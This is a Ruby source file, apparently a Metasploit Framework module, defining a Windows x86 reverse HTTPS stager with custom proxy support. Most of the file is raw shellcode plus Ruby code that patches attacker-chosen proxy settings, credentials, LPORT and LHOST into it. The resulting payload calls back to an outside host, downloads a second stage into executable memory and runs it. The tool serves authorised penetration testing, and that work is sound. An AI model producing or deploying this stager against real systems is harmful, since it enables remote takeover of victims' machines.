##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https_proxy'


module MetasploitModule

  CachedSize = 384

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse HTTPS Stager with Support for Custom Proxy',
      'Description'   => 'Tunnel communication over HTTP using SSL with custom proxy support',
      'Author'        => ['hdm','corelanc0d3r <peter.ve[at]corelan.be>', 'amaloteaux'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttpsProxy,
      'Convention'    => 'sockedi https',
      'Stager'        =>
        {
          'Payload' =>
            "\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C" +
            "\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52" +
            "\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20" +
            "\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC" +
            "\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75" +
            "\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3" +
            "\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF" +
            "\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x6E\x65\x74\x00\x68\x77" +
            "\x69\x6E\x69\x54\x68\x4C\x77\x26\x07\xFF\xD5\xE8\x0F\x00\x00\x00" +
            "\x50\x52\x4F\x58\x59\x48\x4F\x53\x54\x3A\x50\x4F\x52\x54\x00\x59" +
            "\x31\xFF\x57\x54\x51\x6A\x03\x6A\x00\x68\x3A\x56\x79\xA7\xFF\xD5" +
            "\xE9\xC4\x00\x00\x00\x5B\x31\xC9\x51\x51\x6A\x03\x51\x51\x68\x5C" +
            "\x11\x00\x00\x53\x50\x68\x57\x89\x9F\xC6\xFF\xD5\x89\xC6\x50\x52" +
            "\x4F\x58\x59\x5F\x41\x55\x54\x48\x5F\x53\x54\x41\x52\x54\xE8\x0F" +
            "\x00\x00\x00\x50\x52\x4F\x58\x59\x5F\x55\x53\x45\x52\x4E\x41\x4D" +
            "\x45\x00\x59\x6A\x0F\x51\x6A\x2B\x56\x68\x75\x46\x9E\x86\xFF\xD5" +
            "\xE8\x0F\x00\x00\x00\x50\x52\x4F\x58\x59\x5F\x50\x41\x53\x53\x57" +
            "\x4F\x52\x44\x00\x59\x6A\x0F\x51\x6A\x2C\x56\x68\x75\x46\x9E\x86" +
            "\xFF\xD5\x50\x52\x4F\x58\x59\x5F\x41\x55\x54\x48\x5F\x53\x54\x4F" +
            "\x50\xEB\x48\x59\x31\xD2\x52\x68\x00\x32\xA0\x84\x52\x52\x52\x51" +
            "\x52\x56\x68\xEB\x55\x2E\x3B\xFF\xD5\x89\xC6\x6A\x10\x5B\x68\x80" +
            "\x33\x00\x00\x89\xE0\x6A\x04\x50\x6A\x1F\x56\x68\x75\x46\x9E\x86" +
            "\xFF\xD5\x31\xFF\x57\x57\x57\x57\x56\x68\x2D\x06\x18\x7B\xFF\xD5" +
            "\x85\xC0\x75\x1A\x4B\x74\x10\xEB\xD5\xEB\x49\xE8\xB3\xFF\xFF\xFF" +
            "\x2F\x31\x32\x33\x34\x35\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x40" +
            "\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xA4\x53\xE5" +
            "\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68\x00\x20\x00\x00\x53\x56\x68" +
            "\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74\xCD\x8B\x07\x01\xC3\x85\xC0" +
            "\x75\xE5\x58\xC3\xE8\xEC\xFE\xFF\xFF"
        }
      ))


  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate
    p = super

    i = p.index("/12345\x00")
    u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttpsProxy::URI_CHECKSUM_INITW) + "\x00"
    p[i, u.length] = u

    # patch proxy info
    proxyhost = datastore['HttpProxyHost'].to_s
    proxyport = datastore['HttpProxyPort'].to_s || "8080"

    if Rex::Socket.is_ipv6?(proxyhost)
      proxyhost = "[#{proxyhost}]"
    end

    proxyinfo = proxyhost + ":" + proxyport
    if proxyport == "80"
      proxyinfo = proxyhost
    end
    if datastore['HttpProxyType'].to_s == 'HTTP'
      proxyinfo = 'http://' + proxyinfo
    else #socks
      proxyinfo = 'socks=' + proxyinfo
    end

    proxyloc = p.index("PROXYHOST:PORT")
    p = p.gsub("PROXYHOST:PORT",proxyinfo)

    # Patch the call
    calloffset = proxyinfo.length + 1
    p[proxyloc-4] = [calloffset].pack('V')[0]

    # Authentication credentials have not been specified
    if datastore['HttpProxyUser'].to_s == '' ||
       datastore['HttpProxyPass'].to_s == '' ||
       datastore['HttpProxyType'].to_s == 'SOCKS'

      jmp_offset = p.index("PROXY_AUTH_STOP") + 15 - p.index("PROXY_AUTH_START")

      # Remove the authentication code
      p = p.gsub(/PROXY_AUTH_START(.)*PROXY_AUTH_STOP/i, "")
    else
      username_size_diff = 14 - datastore['HttpProxyUser'].to_s.length
      password_size_diff = 14 - datastore['HttpProxyPass'].to_s.length
      jmp_offset =
        16 + # PROXY_AUTH_START length
        15 + # PROXY_AUTH_STOP length
        username_size_diff + # Difference between datastore HttpProxyUser length  and db "HttpProxyUser length"
        password_size_diff   # Same with HttpProxyPass

      # Patch call offset
      username_loc = p.index("PROXY_USERNAME")
      p[username_loc - 4, 4] = [15 - username_size_diff].pack("V")
      password_loc = p.index("PROXY_PASSWORD")
      p[password_loc - 4, 4] = [15 - password_size_diff].pack("V")

      # Remove markers & change login/password
      p = p.gsub("PROXY_AUTH_START","")
      p = p.gsub("PROXY_AUTH_STOP","")
      p = p.gsub("PROXY_USERNAME", datastore['HttpProxyUser'].to_s)
      p = p.gsub("PROXY_PASSWORD", datastore['HttpProxyPass'].to_s)
    end

    # Patch jmp dbl_get_server_host
    jmphost_loc = p.index("\x68\x3a\x56\x79\xa7\xff\xd5") + 8 # push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" ) ; call ebp
    p[jmphost_loc, 4] = [p[jmphost_loc, 4].unpack("V")[0] - jmp_offset].pack("V")

    # Patch call Internetopen
    p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("V")[0] + jmp_offset].pack("V")

    # Patch the LPORT
    lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
    p[lportloc+1,4] = [datastore['LPORT'].to_i].pack('V')

    # Append LHOST and return payload
    p + datastore['LHOST'].to_s + "\x00"

  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end

